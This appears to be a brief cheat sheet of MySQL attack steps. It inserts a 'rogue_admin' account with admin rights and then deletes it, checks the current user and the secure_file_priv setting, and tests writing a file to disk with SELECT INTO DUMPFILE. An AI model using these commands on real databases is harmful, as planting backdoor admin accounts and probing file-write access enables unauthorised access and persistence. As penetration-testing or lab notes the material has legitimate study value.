# CRUD Operations

1. Create rogue admin: `INSERT INTO users (username, password, is_admin) VALUES ('rogue_admin', MD5("RoguePass123"), TRUE);`

2. Delete rogue admin: `DELETE FROM users WHERE username = 'rogue_admin';`

# Filesystem operations

1. View the current user: `SELECT current_user;`
   
2. Check for the `secure_file_priv` setting: `SHOW VARIABLES LIKE 'secure_file_priv';`

3. Trying to create a file: `SELECT 'test123' INTO DUMPFILE '/var/lib/mysql-files/test.txt';`
